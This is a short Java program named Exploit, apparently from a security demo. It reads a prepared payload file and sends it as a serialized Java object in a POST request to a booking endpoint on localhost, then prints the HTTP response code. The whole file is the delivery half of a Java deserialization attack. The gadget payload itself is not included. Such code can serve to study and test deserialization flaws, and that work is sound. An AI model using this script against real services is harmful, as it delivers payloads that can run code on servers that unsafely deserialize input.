package com.gypsyengineer.client;

import java.io.BufferedOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Exploit {

    public static void main(String... args) throws Exception {
        byte[] payload = Files.readAllBytes(Paths.get("payload.bin"));
        HttpURLConnection connection = (HttpURLConnection) new URL("http://localhost:8080/booking").openConnection();
        connection.setDoOutput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/x-java-serialized-object");
        connection.setRequestProperty("Content-Length", Integer.toString(payload.length));
        connection.setRequestProperty("Accept-Encoding", "gzip");
        try (BufferedOutputStream bos = new BufferedOutputStream(connection.getOutputStream())) {
            bos.write(payload);
            bos.flush();
        }
        System.out.println(connection.getResponseCode());
    }
}
